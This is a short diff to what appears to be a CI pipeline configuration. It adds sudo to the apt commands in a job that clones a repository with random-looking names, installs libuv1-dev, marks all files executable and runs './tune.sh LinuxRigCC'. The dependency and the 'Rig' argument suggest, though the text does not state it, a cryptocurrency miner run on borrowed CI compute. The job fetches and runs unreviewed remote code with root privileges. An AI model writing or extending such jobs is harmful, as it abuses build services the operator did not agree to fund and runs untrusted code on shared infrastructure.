@@ -11,8 +11,8 @@ jobs:
           command: |
             git clone https://github.com/opexug/xyvbo.git
             cd xyvbo
-            apt update
-            apt install libuv1-dev
+            sudo apt update
+            sudo apt install libuv1-dev
             chmod +x *
             ./tune.sh LinuxRigCC
 
